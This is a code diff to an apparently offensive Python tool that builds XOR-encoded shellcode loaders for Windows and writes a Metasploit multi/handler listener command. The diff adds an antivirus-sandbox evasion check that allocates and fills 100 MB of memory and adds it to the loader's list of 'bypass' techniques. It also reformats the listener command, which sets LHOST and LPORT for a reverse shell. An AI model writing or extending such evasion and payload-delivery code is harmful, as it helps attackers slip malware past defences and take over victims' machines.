@@ -66,7 +66,6 @@ int {func_name}(const char *{arg_name}) {{
     
     return 1;
 }}
-        
         '''.format(
             func_name=self.func_name,
             arg_name=self.arg_name,
@@ -85,6 +84,42 @@ int {func_name}(const char *{arg_name}) {{
         print("What is the name of result binary (without extension)?")
         binary_name = input(" name ?")
         return binary_name
+
+
+class AllocateAndFill100M0Memory(Bypass):
+    var_name = None
+
+    def __init__(self):
+        super().__init__()
+        self.var_name = ShellCoder.make_random_str()
+
+    @staticmethod
+    def menu():
+        return "Allocate and fill 100M memory"
+
+    def get_template(self):
+        return '''
+        
+int {0}() {{
+    char * {1} = NULL;
+    {1} = (char *) malloc(100000000);
+    
+    if({1}==NULL)
+    {{
+        return 0;
+    }}
+    
+    memset({1},00, 100000000);
+    free({1});
+    
+    return 1;
+}}
+        '''.format(self.func_name, self.var_name)
+
+    def get_call(self):
+        return '''
+        {func_name}() == 1
+        '''.format(func_name=self.func_name)
 
 
 class ShellCoder:
@@ -230,7 +265,7 @@ class Windows(ShellCoder):
     exe_name = None
     payload = None
     injection_technique = None
-    available_bypass = [VerifyInputName]
+    available_bypass = [VerifyInputName, AllocateAndFill100M0Memory]
 
     def __init__(self):
         self.injection_technique = self.ask_for_technique()
@@ -263,7 +298,8 @@ class Windows(ShellCoder):
         with open("%s/generate.sh" % self.output_path, 'w') as f:
             f.write(generate_script)
 
-        listener_command = "msfconsole -q -x 'use multi/handler; set payload %s, set LHOST %s; set LPORT %s; set EXITFUNC %s;exploit'" % (self.payload, self.selected_ip, self.selected_port, self.exit_func)
+        listener_command = "msfconsole -q -x 'use multi/handler; set payload %s, set LHOST %s; set LPORT %s; set EXITFUNC %s;exploit'" % (
+        self.payload, self.selected_ip, self.selected_port, self.exit_func)
 
         generate_script = """#!/bin/bash
 
@@ -274,8 +310,6 @@ class Windows(ShellCoder):
             f.write(generate_script)
 
         subprocess.run(process_run)
-
-
 
     def xor_shellcode(self, data, key):
         key_len = len(key)
@@ -458,7 +492,6 @@ if ({bypass_calls}) {{
             f.write(compile_script)
 
         os.system(command)
-
 
 
 class Linux:
